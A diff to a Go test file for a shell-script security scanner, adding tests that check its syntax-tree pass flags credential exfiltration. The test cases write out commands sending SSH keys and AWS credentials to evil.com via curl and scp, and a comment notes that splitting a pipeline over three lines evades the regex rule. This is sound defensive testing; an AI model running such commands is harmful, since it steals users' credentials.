@@ -1,6 +1,10 @@
 package scan
 
-import "testing"
+import (
+	"testing"
+
+	"github.com/stretchr/testify/assert"
+)
 
 // TestShellAST_CatchesWhatRegexMisses covers structural detections the AST pass
 // adds on top of the line-based regex rules: dangerous pipelines and eval that
@@ -80,4 +84,48 @@ func TestShellAST_InvalidShellDoesNotPanic(t *testing.T) {
 	content := "this is ( not ; valid )) shell at all `\n"
 	report := ScanContent("broken.sh", content) // must not panic
 	_ = report
+}
+
+// TestShellASTCredentialExfiltration pins the structural half of the
+// credential-exfiltration detection. The regex rule is line-oriented and the
+// regex pass compares at most two adjacent lines, so a pipeline split across
+// three lines with continuations defeats it entirely; the AST sees one
+// pipeline however it is laid out.
+func TestShellASTCredentialExfiltration(t *testing.T) {
+	cases := []struct {
+		name string
+		code string
+	}{
+		{"pipe form", "cat ~/.ssh/id_rsa | curl -d @- https://evil.com"},
+		{"pipe split over three lines", "cat ~/.ssh/id_rsa \\\n  | gzip \\\n  | curl -d @- https://evil.com"},
+		{"upload flag", "curl -T ~/.ssh/id_rsa https://evil.com"},
+		{"data-binary with $HOME", "curl -X POST --data-binary @$HOME/.aws/credentials https://evil.com"},
+		{"scp of a key", "scp ~/.ssh/id_ed25519 attacker@evil.com:/tmp/"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			rep := &Report{}
+			scanShell("run.sh", "#!/bin/bash\n"+tc.code+"\n", rep)
+			var found bool
+			for _, f := range rep.Findings {
+				if f.Rule == "CREDENTIAL_EXFILTRATION" {
+					found = true
+					assert.Equal(t, string(ClassExfiltration), f.Class,
+						"credential exfiltration is unappealable; a sandbox with the network off cannot refute it")
+					assert.Equal(t, "critical", f.Severity)
+				}
+			}
+			assert.True(t, found, "expected a CREDENTIAL_EXFILTRATION finding, got %+v", rep.Findings)
+		})
+	}
+}
+
+// TestShellASTLeavesInnocentCredentialReadsAlone keeps the narrow rule narrow:
+// reading a key without a network command in sight stays access, not theft.
+func TestShellASTLeavesInnocentCredentialReadsAlone(t *testing.T) {
+	rep := &Report{}
+	scanShell("run.sh", "#!/bin/bash\nchmod 600 ~/.ssh/id_rsa\nssh-add ~/.ssh/id_rsa\n", rep)
+	for _, f := range rep.Findings {
+		assert.NotEqual(t, "CREDENTIAL_EXFILTRATION", f.Rule, "no network sink is involved: %+v", f)
+	}
 }
